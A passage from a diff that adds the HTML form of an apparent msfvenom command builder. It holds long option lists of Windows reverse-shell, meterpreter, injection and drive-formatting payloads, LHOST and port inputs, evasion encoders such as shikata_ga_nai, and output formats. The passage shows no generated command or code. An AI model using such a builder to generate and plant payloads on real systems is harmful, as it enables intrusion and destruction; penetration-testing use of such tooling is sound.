+                    <option value="windows/dllinject/reverse_http">windows/dllinject/reverse_http</option>
+                    <option value="windows/dllinject/reverse_http_proxy_pstore">windows/dllinject/reverse_http_proxy_pstore</option>
+                    <option value="windows/dllinject/reverse_ipv6_tcp">windows/dllinject/reverse_ipv6_tcp</option>
+                    <option value="windows/dllinject/reverse_nonx_tcp">windows/dllinject/reverse_nonx_tcp</option>
+                    <option value="windows/dllinject/reverse_ord_tcp">windows/dllinject/reverse_ord_tcp</option>
+                    <option value="windows/dllinject/reverse_tcp">windows/dllinject/reverse_tcp</option>
+                    <option value="windows/dllinject/reverse_tcp_allports">windows/dllinject/reverse_tcp_allports</option>
+                    <option value="windows/dllinject/reverse_tcp_dns">windows/dllinject/reverse_tcp_dns</option>
+                    <option value="windows/dllinject/reverse_tcp_rc4">windows/dllinject/reverse_tcp_rc4</option>
+                    <option value="windows/dllinject/reverse_tcp_rc4_dns">windows/dllinject/reverse_tcp_rc4_dns</option>
+                    <option value="windows/dllinject/reverse_tcp_uuid">windows/dllinject/reverse_tcp_uuid</option>
+                    <option value="windows/dllinject/reverse_winhttp">windows/dllinject/reverse_winhttp</option>
+                    <option value="windows/dns_txt_query_exec">windows/dns_txt_query_exec</option>
+                    <option value="windows/download_exec">windows/download_exec</option>
+                    <option value="windows/exec">windows/exec</option>
+                    <option value="windows/format_all_drives">windows/format_all_drives</option>
+                    <option value="windows/loadlibrary">windows/loadlibrary</option>
+                    <option value="windows/messagebox">windows/messagebox</option>
+                    <option value="windows/meterpreter/bind_hidden_ipknock_tcp">windows/meterpreter/bind_hidden_ipknock_tcp</option>
+                    <option value="windows/meterpreter/bind_hidden_tcp">windows/meterpreter/bind_hidden_tcp</option>
+                    <option value="windows/meterpreter/bind_ipv6_tcp">windows/meterpreter/bind_ipv6_tcp</option>
+                    <option value="windows/meterpreter/bind_ipv6_tcp_uuid">windows/meterpreter/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/meterpreter/bind_named_pipe">windows/meterpreter/bind_named_pipe</option>
+                    <option value="windows/meterpreter/bind_nonx_tcp">windows/meterpreter/bind_nonx_tcp</option>
+                    <option value="windows/meterpreter/bind_tcp">windows/meterpreter/bind_tcp</option>
+                    <option value="windows/meterpreter/bind_tcp_rc4">windows/meterpreter/bind_tcp_rc4</option>
+                    <option value="windows/meterpreter/bind_tcp_uuid">windows/meterpreter/bind_tcp_uuid</option>
+                    <option value="windows/meterpreter/find_tag">windows/meterpreter/find_tag</option>
+                    <option value="windows/meterpreter/reverse_hop_http">windows/meterpreter/reverse_hop_http</option>
+                    <option value="windows/meterpreter/reverse_http">windows/meterpreter/reverse_http</option>
+                    <option value="windows/meterpreter/reverse_http_proxy_pstore">windows/meterpreter/reverse_http_proxy_pstore</option>
+                    <option value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</option>
+                    <option value="windows/meterpreter/reverse_https_proxy">windows/meterpreter/reverse_https_proxy</option>
+                    <option value="windows/meterpreter/reverse_ipv6_tcp">windows/meterpreter/reverse_ipv6_tcp</option>
+                    <option value="windows/meterpreter/reverse_named_pipe">windows/meterpreter/reverse_named_pipe</option>
+                    <option value="windows/meterpreter/reverse_nonx_tcp">windows/meterpreter/reverse_nonx_tcp</option>
+                    <option value="windows/meterpreter/reverse_ord_tcp">windows/meterpreter/reverse_ord_tcp</option>
+                    <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
+                    <option value="windows/meterpreter/reverse_tcp_allports">windows/meterpreter/reverse_tcp_allports</option>
+                    <option value="windows/meterpreter/reverse_tcp_dns">windows/meterpreter/reverse_tcp_dns</option>
+                    <option value="windows/meterpreter/reverse_tcp_rc4">windows/meterpreter/reverse_tcp_rc4</option>
+                    <option value="windows/meterpreter/reverse_tcp_rc4_dns">windows/meterpreter/reverse_tcp_rc4_dns</option>
+                    <option value="windows/meterpreter/reverse_tcp_uuid">windows/meterpreter/reverse_tcp_uuid</option>
+                    <option value="windows/meterpreter/reverse_winhttp">windows/meterpreter/reverse_winhttp</option>
+                    <option value="windows/meterpreter/reverse_winhttps">windows/meterpreter/reverse_winhttps</option>
+                    <option value="windows/meterpreter_bind_named_pipe">windows/meterpreter_bind_named_pipe</option>
+                    <option value="windows/meterpreter_bind_tcp">windows/meterpreter_bind_tcp</option>
+                    <option value="windows/meterpreter_reverse_http">windows/meterpreter_reverse_http</option>
+                    <option value="windows/meterpreter_reverse_https">windows/meterpreter_reverse_https</option>
+                    <option value="windows/meterpreter_reverse_ipv6_tcp">windows/meterpreter_reverse_ipv6_tcp</option>
+                    <option value="windows/meterpreter_reverse_tcp">windows/meterpreter_reverse_tcp</option>
+                    <option value="windows/metsvc_bind_tcp">windows/metsvc_bind_tcp</option>
+                    <option value="windows/metsvc_reverse_tcp">windows/metsvc_reverse_tcp</option>
+                    <option value="windows/patchupdllinject/bind_hidden_ipknock_tcp">windows/patchupdllinject/bind_hidden_ipknock_tcp</option>
+                    <option value="windows/patchupdllinject/bind_hidden_tcp">windows/patchupdllinject/bind_hidden_tcp</option>
+                    <option value="windows/patchupdllinject/bind_ipv6_tcp">windows/patchupdllinject/bind_ipv6_tcp</option>
+                    <option value="windows/patchupdllinject/bind_ipv6_tcp_uuid">windows/patchupdllinject/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/patchupdllinject/bind_named_pipe">windows/patchupdllinject/bind_named_pipe</option>
+                    <option value="windows/patchupdllinject/bind_nonx_tcp">windows/patchupdllinject/bind_nonx_tcp</option>
+                    <option value="windows/patchupdllinject/bind_tcp">windows/patchupdllinject/bind_tcp</option>
+                    <option value="windows/patchupdllinject/bind_tcp_rc4">windows/patchupdllinject/bind_tcp_rc4</option>
+                    <option value="windows/patchupdllinject/bind_tcp_uuid">windows/patchupdllinject/bind_tcp_uuid</option>
+                    <option value="windows/patchupdllinject/find_tag">windows/patchupdllinject/find_tag</option>
+                    <option value="windows/patchupdllinject/reverse_ipv6_tcp">windows/patchupdllinject/reverse_ipv6_tcp</option>
+                    <option value="windows/patchupdllinject/reverse_nonx_tcp">windows/patchupdllinject/reverse_nonx_tcp</option>
+                    <option value="windows/patchupdllinject/reverse_ord_tcp">windows/patchupdllinject/reverse_ord_tcp</option>
+                    <option value="windows/patchupdllinject/reverse_tcp">windows/patchupdllinject/reverse_tcp</option>
+                    <option value="windows/patchupdllinject/reverse_tcp_allports">windows/patchupdllinject/reverse_tcp_allports</option>
+                    <option value="windows/patchupdllinject/reverse_tcp_dns">windows/patchupdllinject/reverse_tcp_dns</option>
+                    <option value="windows/patchupdllinject/reverse_tcp_rc4">windows/patchupdllinject/reverse_tcp_rc4</option>
+                    <option value="windows/patchupdllinject/reverse_tcp_rc4_dns">windows/patchupdllinject/reverse_tcp_rc4_dns</option>
+                    <option value="windows/patchupdllinject/reverse_tcp_uuid">windows/patchupdllinject/reverse_tcp_uuid</option>
+                    <option value="windows/patchupmeterpreter/bind_hidden_ipknock_tcp">windows/patchupmeterpreter/bind_hidden_ipknock_tcp</option>
+                    <option value="windows/patchupmeterpreter/bind_hidden_tcp">windows/patchupmeterpreter/bind_hidden_tcp</option>
+                    <option value="windows/patchupmeterpreter/bind_ipv6_tcp">windows/patchupmeterpreter/bind_ipv6_tcp</option>
+                    <option value="windows/patchupmeterpreter/bind_ipv6_tcp_uuid">windows/patchupmeterpreter/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/patchupmeterpreter/bind_named_pipe">windows/patchupmeterpreter/bind_named_pipe</option>
+                    <option value="windows/patchupmeterpreter/bind_nonx_tcp">windows/patchupmeterpreter/bind_nonx_tcp</option>
+                    <option value="windows/patchupmeterpreter/bind_tcp">windows/patchupmeterpreter/bind_tcp</option>
+                    <option value="windows/patchupmeterpreter/bind_tcp_rc4">windows/patchupmeterpreter/bind_tcp_rc4</option>
+                    <option value="windows/patchupmeterpreter/bind_tcp_uuid">windows/patchupmeterpreter/bind_tcp_uuid</option>
+                    <option value="windows/patchupmeterpreter/find_tag">windows/patchupmeterpreter/find_tag</option>
+                    <option value="windows/patchupmeterpreter/reverse_ipv6_tcp">windows/patchupmeterpreter/reverse_ipv6_tcp</option>
+                    <option value="windows/patchupmeterpreter/reverse_nonx_tcp">windows/patchupmeterpreter/reverse_nonx_tcp</option>
+                    <option value="windows/patchupmeterpreter/reverse_ord_tcp">windows/patchupmeterpreter/reverse_ord_tcp</option>
+                    <option value="windows/patchupmeterpreter/reverse_tcp">windows/patchupmeterpreter/reverse_tcp</option>
+                    <option value="windows/patchupmeterpreter/reverse_tcp_allports">windows/patchupmeterpreter/reverse_tcp_allports</option>
+                    <option value="windows/patchupmeterpreter/reverse_tcp_dns">windows/patchupmeterpreter/reverse_tcp_dns</option>
+                    <option value="windows/patchupmeterpreter/reverse_tcp_rc4">windows/patchupmeterpreter/reverse_tcp_rc4</option>
+                    <option value="windows/patchupmeterpreter/reverse_tcp_rc4_dns">windows/patchupmeterpreter/reverse_tcp_rc4_dns</option>
+                    <option value="windows/patchupmeterpreter/reverse_tcp_uuid">windows/patchupmeterpreter/reverse_tcp_uuid</option>
+                    <option value="windows/peinject/bind_hidden_ipknock_tcp">windows/peinject/bind_hidden_ipknock_tcp</option>
+                    <option value="windows/peinject/bind_hidden_tcp">windows/peinject/bind_hidden_tcp</option>
+                    <option value="windows/peinject/bind_ipv6_tcp">windows/peinject/bind_ipv6_tcp</option>
+                    <option value="windows/peinject/bind_ipv6_tcp_uuid">windows/peinject/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/peinject/bind_named_pipe">windows/peinject/bind_named_pipe</option>
+                    <option value="windows/peinject/bind_nonx_tcp">windows/peinject/bind_nonx_tcp</option>
+                    <option value="windows/peinject/bind_tcp">windows/peinject/bind_tcp</option>
+                    <option value="windows/peinject/bind_tcp_rc4">windows/peinject/bind_tcp_rc4</option>
+                    <option value="windows/peinject/bind_tcp_uuid">windows/peinject/bind_tcp_uuid</option>
+                    <option value="windows/peinject/find_tag">windows/peinject/find_tag</option>
+                    <option value="windows/peinject/reverse_ipv6_tcp">windows/peinject/reverse_ipv6_tcp</option>
+                    <option value="windows/peinject/reverse_named_pipe">windows/peinject/reverse_named_pipe</option>
+                    <option value="windows/peinject/reverse_nonx_tcp">windows/peinject/reverse_nonx_tcp</option>
+                    <option value="windows/peinject/reverse_ord_tcp">windows/peinject/reverse_ord_tcp</option>
+                    <option value="windows/peinject/reverse_tcp">windows/peinject/reverse_tcp</option>
+                    <option value="windows/peinject/reverse_tcp_allports">windows/peinject/reverse_tcp_allports</option>
+                    <option value="windows/peinject/reverse_tcp_dns">windows/peinject/reverse_tcp_dns</option>
+                    <option value="windows/peinject/reverse_tcp_rc4">windows/peinject/reverse_tcp_rc4</option>
+                    <option value="windows/peinject/reverse_tcp_rc4_dns">windows/peinject/reverse_tcp_rc4_dns</option>
+                    <option value="windows/peinject/reverse_tcp_uuid">windows/peinject/reverse_tcp_uuid</option>
+                    <option value="windows/pingback_bind_tcp">windows/pingback_bind_tcp</option>
+                    <option value="windows/pingback_reverse_tcp">windows/pingback_reverse_tcp</option>
+                    <option value="windows/powershell_bind_tcp">windows/powershell_bind_tcp</option>
+                    <option value="windows/powershell_reverse_tcp">windows/powershell_reverse_tcp</option>
+                    <option value="windows/shell/bind_hidden_ipknock_tcp">windows/shell/bind_hidden_ipknock_tcp</option>
+                    <option value="windows/shell/bind_hidden_tcp">windows/shell/bind_hidden_tcp</option>
+                    <option value="windows/shell/bind_ipv6_tcp">windows/shell/bind_ipv6_tcp</option>
+                    <option value="windows/shell/bind_ipv6_tcp_uuid">windows/shell/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/shell/bind_named_pipe">windows/shell/bind_named_pipe</option>
+                    <option value="windows/shell/bind_nonx_tcp">windows/shell/bind_nonx_tcp</option>
+                    <option value="windows/shell/bind_tcp">windows/shell/bind_tcp</option>
+                    <option value="windows/shell/bind_tcp_rc4">windows/shell/bind_tcp_rc4</option>
+                    <option value="windows/shell/bind_tcp_uuid">windows/shell/bind_tcp_uuid</option>
+                    <option value="windows/shell/find_tag">windows/shell/find_tag</option>
+                    <option value="windows/shell/reverse_ipv6_tcp">windows/shell/reverse_ipv6_tcp</option>
+                    <option value="windows/shell/reverse_nonx_tcp">windows/shell/reverse_nonx_tcp</option>
+                    <option value="windows/shell/reverse_ord_tcp">windows/shell/reverse_ord_tcp</option>
+                    <option value="windows/shell/reverse_tcp">windows/shell/reverse_tcp</option>
+                    <option value="windows/shell/reverse_tcp_allports">windows/shell/reverse_tcp_allports</option>
+                    <option value="windows/shell/reverse_tcp_dns">windows/shell/reverse_tcp_dns</option>
+                    <option value="windows/shell/reverse_tcp_rc4">windows/shell/reverse_tcp_rc4</option>
+                    <option value="windows/shell/reverse_tcp_rc4_dns">windows/shell/reverse_tcp_rc4_dns</option>
+                    <option value="windows/shell/reverse_tcp_uuid">windows/shell/reverse_tcp_uuid</option>
+                    <option value="windows/shell/reverse_udp">windows/shell/reverse_udp</option>
+                    <option value="windows/shell_bind_tcp">windows/shell_bind_tcp</option>
+                    <option value="windows/shell_bind_tcp_xpfw">windows/shell_bind_tcp_xpfw</option>
+                    <option value="windows/shell_hidden_bind_tcp">windows/shell_hidden_bind_tcp</option>
+                    <option value="windows/shell_reverse_tcp">windows/shell_reverse_tcp</option>
+                    <option value="windows/speak_pwned">windows/speak_pwned</option>
+                    <option value="windows/upexec/bind_hidden_ipknock_tcp">windows/upexec/bind_hidden_ipknock_tcp</option>
+                    <option value="windows/upexec/bind_hidden_tcp">windows/upexec/bind_hidden_tcp</option>
+                    <option value="windows/upexec/bind_ipv6_tcp">windows/upexec/bind_ipv6_tcp</option>
+                    <option value="windows/upexec/bind_ipv6_tcp_uuid">windows/upexec/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/upexec/bind_named_pipe">windows/upexec/bind_named_pipe</option>
+                    <option value="windows/upexec/bind_nonx_tcp">windows/upexec/bind_nonx_tcp</option>
+                    <option value="windows/upexec/bind_tcp">windows/upexec/bind_tcp</option>
+                    <option value="windows/upexec/bind_tcp_rc4">windows/upexec/bind_tcp_rc4</option>
+                    <option value="windows/upexec/bind_tcp_uuid">windows/upexec/bind_tcp_uuid</option>
+                    <option value="windows/upexec/find_tag">windows/upexec/find_tag</option>
+                    <option value="windows/upexec/reverse_ipv6_tcp">windows/upexec/reverse_ipv6_tcp</option>
+                    <option value="windows/upexec/reverse_nonx_tcp">windows/upexec/reverse_nonx_tcp</option>
+                    <option value="windows/upexec/reverse_ord_tcp">windows/upexec/reverse_ord_tcp</option>
+                    <option value="windows/upexec/reverse_tcp">windows/upexec/reverse_tcp</option>
+                    <option value="windows/upexec/reverse_tcp_allports">windows/upexec/reverse_tcp_allports</option>
+                    <option value="windows/upexec/reverse_tcp_dns">windows/upexec/reverse_tcp_dns</option>
+                    <option value="windows/upexec/reverse_tcp_rc4">windows/upexec/reverse_tcp_rc4</option>
+                    <option value="windows/upexec/reverse_tcp_rc4_dns">windows/upexec/reverse_tcp_rc4_dns</option>
+                    <option value="windows/upexec/reverse_tcp_uuid">windows/upexec/reverse_tcp_uuid</option>
+                    <option value="windows/upexec/reverse_udp">windows/upexec/reverse_udp</option>
+                    <option value="windows/vncinject/bind_hidden_ipknock_tcp">windows/vncinject/bind_hidden_ipknock_tcp</option>
+                    <option value="windows/vncinject/bind_hidden_tcp">windows/vncinject/bind_hidden_tcp</option>
+                    <option value="windows/vncinject/bind_ipv6_tcp">windows/vncinject/bind_ipv6_tcp</option>
+                    <option value="windows/vncinject/bind_ipv6_tcp_uuid">windows/vncinject/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/vncinject/bind_named_pipe">windows/vncinject/bind_named_pipe</option>
+                    <option value="windows/vncinject/bind_nonx_tcp">windows/vncinject/bind_nonx_tcp</option>
+                    <option value="windows/vncinject/bind_tcp">windows/vncinject/bind_tcp</option>
+                    <option value="windows/vncinject/bind_tcp_rc4">windows/vncinject/bind_tcp_rc4</option>
+                    <option value="windows/vncinject/bind_tcp_uuid">windows/vncinject/bind_tcp_uuid</option>
+                    <option value="windows/vncinject/find_tag">windows/vncinject/find_tag</option>
+                    <option value="windows/vncinject/reverse_hop_http">windows/vncinject/reverse_hop_http</option>
+                    <option value="windows/vncinject/reverse_http">windows/vncinject/reverse_http</option>
+                    <option value="windows/vncinject/reverse_http_proxy_pstore">windows/vncinject/reverse_http_proxy_pstore</option>
+                    <option value="windows/vncinject/reverse_ipv6_tcp">windows/vncinject/reverse_ipv6_tcp</option>
+                    <option value="windows/vncinject/reverse_nonx_tcp">windows/vncinject/reverse_nonx_tcp</option>
+                    <option value="windows/vncinject/reverse_ord_tcp">windows/vncinject/reverse_ord_tcp</option>
+                    <option value="windows/vncinject/reverse_tcp">windows/vncinject/reverse_tcp</option>
+                    <option value="windows/vncinject/reverse_tcp_allports">windows/vncinject/reverse_tcp_allports</option>
+                    <option value="windows/vncinject/reverse_tcp_dns">windows/vncinject/reverse_tcp_dns</option>
+                    <option value="windows/vncinject/reverse_tcp_rc4">windows/vncinject/reverse_tcp_rc4</option>
+                    <option value="windows/vncinject/reverse_tcp_rc4_dns">windows/vncinject/reverse_tcp_rc4_dns</option>
+                    <option value="windows/vncinject/reverse_tcp_uuid">windows/vncinject/reverse_tcp_uuid</option>
+                    <option value="windows/vncinject/reverse_winhttp">windows/vncinject/reverse_winhttp</option>
+                    <option value="windows/x64/exec">windows/x64/exec</option>
+                    <option value="windows/x64/loadlibrary">windows/x64/loadlibrary</option>
+                    <option value="windows/x64/messagebox">windows/x64/messagebox</option>
+                    <option value="windows/x64/meterpreter/bind_ipv6_tcp">windows/x64/meterpreter/bind_ipv6_tcp</option>
+                    <option value="windows/x64/meterpreter/bind_ipv6_tcp_uuid">windows/x64/meterpreter/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/x64/meterpreter/bind_named_pipe">windows/x64/meterpreter/bind_named_pipe</option>
+                    <option value="windows/x64/meterpreter/bind_tcp">windows/x64/meterpreter/bind_tcp</option>
+                    <option value="windows/x64/meterpreter/bind_tcp_rc4">windows/x64/meterpreter/bind_tcp_rc4</option>
+                    <option value="windows/x64/meterpreter/bind_tcp_uuid">windows/x64/meterpreter/bind_tcp_uuid</option>
+                    <option value="windows/x64/meterpreter/reverse_http">windows/x64/meterpreter/reverse_http</option>
+                    <option value="windows/x64/meterpreter/reverse_https">windows/x64/meterpreter/reverse_https</option>
+                    <option value="windows/x64/meterpreter/reverse_named_pipe">windows/x64/meterpreter/reverse_named_pipe</option>
+                    <option value="windows/x64/meterpreter/reverse_tcp">windows/x64/meterpreter/reverse_tcp</option>
+                    <option value="windows/x64/meterpreter/reverse_tcp_rc4">windows/x64/meterpreter/reverse_tcp_rc4</option>
+                    <option value="windows/x64/meterpreter/reverse_tcp_uuid">windows/x64/meterpreter/reverse_tcp_uuid</option>
+                    <option value="windows/x64/meterpreter/reverse_winhttp">windows/x64/meterpreter/reverse_winhttp</option>
+                    <option value="windows/x64/meterpreter/reverse_winhttps">windows/x64/meterpreter/reverse_winhttps</option>
+                    <option value="windows/x64/meterpreter_bind_named_pipe">windows/x64/meterpreter_bind_named_pipe</option>
+                    <option value="windows/x64/meterpreter_bind_tcp">windows/x64/meterpreter_bind_tcp</option>
+                    <option value="windows/x64/meterpreter_reverse_http">windows/x64/meterpreter_reverse_http</option>
+                    <option value="windows/x64/meterpreter_reverse_https">windows/x64/meterpreter_reverse_https</option>
+                    <option value="windows/x64/meterpreter_reverse_ipv6_tcp">windows/x64/meterpreter_reverse_ipv6_tcp</option>
+                    <option value="windows/x64/meterpreter_reverse_tcp">windows/x64/meterpreter_reverse_tcp</option>
+                    <option value="windows/x64/peinject/bind_ipv6_tcp">windows/x64/peinject/bind_ipv6_tcp</option>
+                    <option value="windows/x64/peinject/bind_ipv6_tcp_uuid">windows/x64/peinject/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/x64/peinject/bind_named_pipe">windows/x64/peinject/bind_named_pipe</option>
+                    <option value="windows/x64/peinject/bind_tcp">windows/x64/peinject/bind_tcp</option>
+                    <option value="windows/x64/peinject/bind_tcp_rc4">windows/x64/peinject/bind_tcp_rc4</option>
+                    <option value="windows/x64/peinject/bind_tcp_uuid">windows/x64/peinject/bind_tcp_uuid</option>
+                    <option value="windows/x64/peinject/reverse_named_pipe">windows/x64/peinject/reverse_named_pipe</option>
+                    <option value="windows/x64/peinject/reverse_tcp">windows/x64/peinject/reverse_tcp</option>
+                    <option value="windows/x64/peinject/reverse_tcp_rc4">windows/x64/peinject/reverse_tcp_rc4</option>
+                    <option value="windows/x64/peinject/reverse_tcp_uuid">windows/x64/peinject/reverse_tcp_uuid</option>
+                    <option value="windows/x64/pingback_reverse_tcp">windows/x64/pingback_reverse_tcp</option>
+                    <option value="windows/x64/powershell_bind_tcp">windows/x64/powershell_bind_tcp</option>
+                    <option value="windows/x64/powershell_reverse_tcp">windows/x64/powershell_reverse_tcp</option>
+                    <option value="windows/x64/shell/bind_ipv6_tcp">windows/x64/shell/bind_ipv6_tcp</option>
+                    <option value="windows/x64/shell/bind_ipv6_tcp_uuid">windows/x64/shell/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/x64/shell/bind_named_pipe">windows/x64/shell/bind_named_pipe</option>
+                    <option value="windows/x64/shell/bind_tcp">windows/x64/shell/bind_tcp</option>
+                    <option value="windows/x64/shell/bind_tcp_rc4">windows/x64/shell/bind_tcp_rc4</option>
+                    <option value="windows/x64/shell/bind_tcp_uuid">windows/x64/shell/bind_tcp_uuid</option>
+                    <option value="windows/x64/shell/reverse_tcp">windows/x64/shell/reverse_tcp</option>
+                    <option value="windows/x64/shell/reverse_tcp_rc4">windows/x64/shell/reverse_tcp_rc4</option>
+                    <option value="windows/x64/shell/reverse_tcp_uuid">windows/x64/shell/reverse_tcp_uuid</option>
+                    <option value="windows/x64/shell_bind_tcp">windows/x64/shell_bind_tcp</option>
+                    <option value="windows/x64/shell_reverse_tcp">windows/x64/shell_reverse_tcp</option>
+                    <option value="windows/x64/vncinject/bind_ipv6_tcp">windows/x64/vncinject/bind_ipv6_tcp</option>
+                    <option value="windows/x64/vncinject/bind_ipv6_tcp_uuid">windows/x64/vncinject/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/x64/vncinject/bind_named_pipe">windows/x64/vncinject/bind_named_pipe</option>
+                    <option value="windows/x64/vncinject/bind_tcp">windows/x64/vncinject/bind_tcp</option>
+                    <option value="windows/x64/vncinject/bind_tcp_rc4">windows/x64/vncinject/bind_tcp_rc4</option>
+                    <option value="windows/x64/vncinject/bind_tcp_uuid">windows/x64/vncinject/bind_tcp_uuid</option>
+                    <option value="windows/x64/vncinject/reverse_http">windows/x64/vncinject/reverse_http</option>
+                    <option value="windows/x64/vncinject/reverse_https">windows/x64/vncinject/reverse_https</option>
+                    <option value="windows/x64/vncinject/reverse_tcp">windows/x64/vncinject/reverse_tcp</option>
+                    <option value="windows/x64/vncinject/reverse_tcp_rc4">windows/x64/vncinject/reverse_tcp_rc4</option>
+                    <option value="windows/x64/vncinject/reverse_tcp_uuid">windows/x64/vncinject/reverse_tcp_uuid</option>
+                    <option value="windows/x64/vncinject/reverse_winhttp">windows/x64/vncinject/reverse_winhttp</option>
+                    <option value="windows/x64/vncinject/reverse_winhttps">windows/x64/vncinject/reverse_winhttps</option>
+                </select>
+                <span style="color: red;">*</span>
+                LHOST：
+                <input type="text" id="msfbuilderinputText1" oninput="msfbuilderdisplayText()" style="height: 50px;width: 300px;"
+                value="192.168.1.1">
+                <span style="color: red;">*</span>
+                Port：&nbsp;&nbsp;&nbsp;
+                <input type="text" id="msfbuilderinputText2" oninput="msfbuilderdisplayText()" style="height: 50px;width: 300px;"
+                value="1234"><br>
+                Encoder：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                <select onmouseout="msfbuilderdisplayText()" id="msfbuilderinputText3">
+                    <option value="cmd/echo">cmd/echo</option>
+                    <option value="cmd/generic_sh">cmd/generic_sh</option>
+                    <option value="cmd/ifs">cmd/ifs</option>
+                    <option value="cmd/perl">cmd/perl</option>
+                    <option value="cmd/powershell_base64">cmd/powershell_base64</option>
+                    <option value="cmd/printf_php_mq">cmd/printf_php_mq</option>
+                    <option value="generic/eicar">generic/eicar</option>
+                    <option value="generic/none">generic/none</option>
+                    <option value="mipsbe/byte_xori">mipsbe/byte_xori</option>
+                    <option value="mipsbe/longxor">mipsbe/longxor</option>
+                    <option value="mipsle/byte_xori">mipsle/byte_xori</option>
+                    <option value="mipsle/longxor">mipsle/longxor</option>
+                    <option value="php/base64">php/base64</option>
+                    <option value="ppc/longxor">ppc/longxor</option>
+                    <option value="ppc/longxor_tag">ppc/longxor_tag</option>
+                    <option value="ruby/base64">ruby/base64</option>
+                    <option value="sparc/longxor_tag">sparc/longxor_tag</option>
+                    <option value="x64/xor">x64/xor</option>
+                    <option value="x64/zutto_dekiru">x64/zutto_dekiru</option>
+                    <option value="x86/add_sub">x86/add_sub</option>
+                    <option value="x86/alpha_mixed">x86/alpha_mixed</option>
+                    <option value="x86/alpha_upper">x86/alpha_upper</option>
+                    <option value="x86/avoid_underscore_tolower">x86/avoid_underscore_tolower</option>
+                    <option value="x86/avoid_utf8_tolower">x86/avoid_utf8_tolower</option>
+                    <option value="x86/bloxor">x86/bloxor</option>
+                    <option value="x86/bloxor">x86/bloxor</option>
+                    <option value="x86/call4_dword_xor">x86/call4_dword_xor</option>
+                    <option value="x86/context_cpuid">x86/context_cpuid</option>
+                    <option value="x86/context_stat">x86/context_stat</option>
+                    <option value="x86/context_time">x86/context_time</option>
+                    <option value="x86/countdown">x86/countdown</option>
+                    <option value="x86/fnstenv_mov">x86/fnstenv_mov</option>
+                    <option value="x86/jmp_call_additive">x86/jmp_call_additive</option>
+                    <option value="x86/nonalpha">x86/nonalpha</option>
+                    <option value="x86/nonupper">x86/nonupper</option>
+                    <option value="x86/opt_sub">x86/opt_sub</option>
+                    <option value="x86/service">x86/service</option>
+                    <option value="x86/shikata_ga_nai">x86/shikata_ga_nai</option>
+                    <option value="x86/single_static_bit">x86/single_static_bit</option>
+                    <option value="x86/unicode_mixed">x86/unicode_mixed</option>
+                    <option value="x86/unicode_upper">x86/unicode_upper</option>
+                </select>
+                Iterations：<input type="text" id="msfbuilderinputText4" oninput="msfbuilderdisplayText()" style="height: 50px;width: 300px;"
+                value="1234">
+                Platform：
+                <select onmouseout="msfbuilderdisplayText()" id="msfbuilderinputText5">
+                    <option value="aix">aix</option>
+                    <option value="android">android</option>
+                    <option value="apple_ios">apple_ios</option>
+                    <option value="bsd">bsd</option>
+                    <option value="bsdi">bsdi</option>
+                    <option value="cisco">cisco</option>
+                    <option value="firefox">firefox</option>
+                    <option value="freebsd">freebsd</option>
+                    <option value="hardware">hardware</option>
+                    <option value="hpux">hpux</option>
+                    <option value="irix">irix</option>
+                    <option value="java">java</option>
+                    <option value="javascript">javascript</option>
+                    <option value="juniper">juniper</option>
+                    <option value="linux">linux</option>
+                    <option value="mainframe">mainframe</option>
+                    <option value="multi">multi</option>
+                    <option value="netbsd">netbsd</option>
+                    <option value="netware">netware</option>
+                    <option value="nodejs">nodejs</option>
+                    <option value="openbsd">openbsd</option>
+                    <option value="osx">osx</option>
+                    <option value="php">php</option>
+                    <option value="python">python</option>
+                    <option value="r">r</option>
+                    <option value="ruby">ruby</option>
+                    <option value="solaris">solaris</option>
+                    <option value="unix">unix</option>
+                    <option value="windows">windows</option>
+                </select><br>
+                Architecture：&nbsp;
+                <select onmouseout="msfbuilderdisplayText()" id="msfbuilderinputText6">
+                    <option value="x64">x64</option>
+                    <option value="x86">x86</option>
+                </select>
+                Nop's：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                <input type="text" id="msfbuilderinputText7" oninput="msfbuilderdisplayText()" style="height: 50px;width: 300px;"
+                value="200">
+                Format：&nbsp;&nbsp;
+                <select onmouseout="msfbuilderdisplayText()" id="msfbuilderinputText8">
+                    <option value="asp">asp</option>
+                    <option value="aspx">aspx</option>
+                    <option value="aspx-exe">aspx-exe</option>
+                    <option value="axis2">axis2</option>
+                    <option value="bash">bash</option>
+                    <option value="c">c</option>
+                    <option value="csharp">csharp</option>
+                    <option value="dll">dll</option>
+                    <option value="dw">dw</option>
+                    <option value="dword">dword</option>
+                    <option value="elf">elf</option>
+                    <option value="elf-so">elf-so</option>
+                    <option value="exe">exe</option>
+                    <option value="exe-only">exe-only</option>
+                    <option value="exe-service">exe-service</option>
+                    <option value="exe-small">exe-small</option>
+                    <option value="hex">hex</option>
+                    <option value="hta-psh">hta-psh</option>
+                    <option value="jar">jar</option>
+                    <option value="java">java</option>
+                    <option value="js_be">js_be</option>
+                    <option value="js_le">js_le</option>
+                    <option value="jsp">jsp</option>
+                    <option value="loop-vbs">loop-vbs</option>
+                    <option value="macho">macho</option>
+                    <option value="msi">msi</option>
+                    <option value="msi-nouac">msi-nouac</option>
+                    <option value="num">num</option>
+                    <option value="osx-app">osx-app</option>
+                    <option value="perl">perl</option>
+                    <option value="pl">pl</option>
+                    <option value="powershell">powershell</option>
+                    <option value="ps1">ps1</option>
+                    <option value="psh">psh</option>
+                    <option value="psh-cmd">psh-cmd</option>
+                    <option value="psh-net">psh-net</option>
+                    <option value="psh-reflection">psh-reflection</option>
+                    <option value="py">py</option>
+                    <option value="python">python</option>
+                    <option value="raw">raw</option>
+                    <option value="rb">rb</option>
+                    <option value="ruby">ruby</option>
+                    <option value="sh">sh</option>
+                    <option value="vba">vba</option>
+                    <option value="vba-exe">vba-exe</option>
+                    <option value="vbapplication">vbapplication</option>
+                    <option value="vba-psh">vba-psh</option>
+                    <option value="vbs">vbs</option>
+                    <option value="vbscript">vbscript</option>
